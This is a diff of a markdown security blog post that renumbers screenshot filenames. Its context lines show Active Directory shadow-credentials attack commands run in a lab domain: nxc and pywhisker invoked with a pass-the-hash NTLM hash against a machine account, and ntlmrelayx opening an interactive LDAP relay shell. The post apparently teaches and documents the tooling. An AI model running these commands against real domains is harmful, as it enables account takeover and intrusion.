@@ -246,18 +246,18 @@ As a computer account, we have to take the extra step of deleting the attribute 
 3. Restore the previous entry:
 `nxc ldap WINTERFELL -u CASTELBLACK$ -H 66c86c897975e1c873c1abc19670c2e7 -M shadow-creds -o TARGET=CASTELBLACK$ ACTION=revert JSONFILE=CASTELBLACK\$-keycredential.json`
 
-![markdown](/media/2026/09/shadowcredz27.png)
+![markdown](/media/2026/09/shadowcredz18.png)
 
 **pywhisker**
 1. Delete the current entry:
 `pywhisker --target 'CASTELBLACK$' -d north.sevenkingdoms.local -u 'CASTELBLACK$' -H 66c86c897975e1c873c1abc19670c2e7 --action clear`
 
-![markdown](/media/2026/09/shadowcredz28.png)
+![markdown](/media/2026/09/shadowcredz27.png)
 
 2. Restore the previous entry:
 `pywhisker --target 'CASTELBLACK$' -d north.sevenkingdoms.local -u 'CASTELBLACK$' -H 66c86c897975e1c873c1abc19670c2e7 --action import -f CASTELBLACK\$-keycredential.json`
 
-![markdown](/media/2026/09/shadowcredz29.png)
+![markdown](/media/2026/09/shadowcredz28.png)
 
 ## Other New Features
 The LDAP Shell has also gained two new features:
@@ -267,19 +267,19 @@ The LDAP Shell has also gained two new features:
 We can use the interactive LDAP shell with the following command:
 `ntlmrelayx.py -t ldap://WINTERFELL.north.sevenkingdoms.local --interactive`
 
-![markdown](/media/2026/09/shadowcredz30.png)
+![markdown](/media/2026/09/shadowcredz29.png)
 
 When an authentication request is received, the shell becomes available
 
-![markdown](/media/2026/09/shadowcredz31.png)
+![markdown](/media/2026/09/shadowcredz30.png)
 
 And we can connect to it using nc to then display all shadow credentials commands
 
-![markdown](/media/2026/09/shadowcredz32.png)
+![markdown](/media/2026/09/shadowcredz31.png)
 
 One possible sequence of operations would be as follows:
 
-![markdown](/media/2026/09/shadowcredz33.png)
+![markdown](/media/2026/09/shadowcredz32.png)
 
 1. First, an attempt is made to set an entry using `set_shadow_creds CASTELBLACK$`. However, this fails because an entry already exists.
 2. The existing entry is backed up using `backup_shadow_creds CASTELBLACK$ backup.json`
